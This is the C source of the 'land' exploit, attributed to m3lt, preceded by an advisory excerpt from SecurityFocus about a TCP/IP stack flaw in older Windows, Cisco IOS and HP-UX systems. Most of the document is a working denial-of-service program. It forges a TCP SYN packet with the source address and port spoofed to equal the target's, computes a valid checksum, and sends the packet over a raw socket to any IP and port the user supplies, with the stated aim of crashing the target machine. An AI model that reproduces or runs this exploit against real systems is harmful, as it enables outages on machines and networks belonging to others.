/*
source: http://www.securityfocus.com/bid/2666/info
  
A number of TCP/IP stacks are vulnerable to a "loopback" condition initiated by sending a TCP SYN packet with the source address and port spoofed to equal the destination source and port. When a packet of this sort is received, an infinite loop is initiated and the affected system halts. This is known to affect Windows 95, Windows NT 4.0 up to SP3, Windows Server 2003, Windows XP SP2, Cisco IOS devices & Catalyst switches, and HP-UX up to 11.00.
  
It is noted that on Windows Server 2003 and XP SP2, the TCP and IP checksums must be correct to trigger the issue.
  
**Update: It is reported that Microsoft platforms are also prone to this vulnerability. The vendor reports that network routers may not route malformed TCP/IP packets used to exploit this issue. As a result, an attacker may have to discover a suitable route to a target computer, or reside on the target network segment itself before exploitation is possible. 
*/

/* land.c by m3lt, FLC
   crashes a win95 box */

#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_tcp.h>
#include <netinet/protocols.h>

struct pseudohdr
{
        struct in_addr saddr;
        struct in_addr daddr;
        u_char zero;
        u_char protocol;
        u_short length;
        struct tcphdr tcpheader;
};

u_short checksum(u_short * data,u_short length)
{
        register long value;
        u_short i;

        for(i=0;i<(length>>1);i++)
                value+=data[i];

        if((length&1)==1)
                value+=(data[i]<<8);

        value=(value&65535)+(value>>16);

        return(~value);
}

int main(int argc,char * * argv)
{
        struct sockaddr_in sin;
        struct hostent * hoste;
        int sock;
        char buffer[40];
        struct iphdr * ipheader=(struct iphdr *) buffer;
        struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
        struct pseudohdr pseudoheader;

        fprintf(stderr,"land.c by m3lt, FLC\n");

        if(argc<3)
        {
                fprintf(stderr,"usage: %s IP port\n",argv[0]);
                return(-1);
        }

        bzero(&sin,sizeof(struct sockaddr_in));
        sin.sin_family=AF_INET;

        if((hoste=gethostbyname(argv[1]))!=NULL)
                bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
        else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)
        {
                fprintf(stderr,"unknown host %s\n",argv[1]);
                return(-1);
        }

        if((sin.sin_port=htons(atoi(argv[2])))==0)
        {
                fprintf(stderr,"unknown port %s\n",argv[2]);
                return(-1);
        }

        if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
        {
                fprintf(stderr,"couldn't allocate raw socket\n");
                return(-1);
        }

        bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->version=4;
        ipheader->ihl=sizeof(struct iphdr)/4;
        ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->id=htons(0xF1C);
        ipheader->ttl=255;
        ipheader->protocol=IP_TCP;
        ipheader->saddr=sin.sin_addr.s_addr;
        ipheader->daddr=sin.sin_addr.s_addr;

        tcpheader->th_sport=sin.sin_port;
        tcpheader->th_dport=sin.sin_port;
        tcpheader->th_seq=htonl(0xF1C);
        tcpheader->th_flags=TH_SYN;
        tcpheader->th_off=sizeof(struct tcphdr)/4;
        tcpheader->th_win=htons(2048);

        bzero(&pseudoheader,12+sizeof(struct tcphdr));
        pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
        pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
        pseudoheader.protocol=6;
        pseudoheader.length=htons(sizeof(struct tcphdr));
        bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
        tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));

        if(sendto(sock,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct
sockaddr_in))==-1)
        {
                fprintf(stderr,"couldn't send packet\n");
                return(-1);
        }

        fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);

        close(sock);
        return(0);
}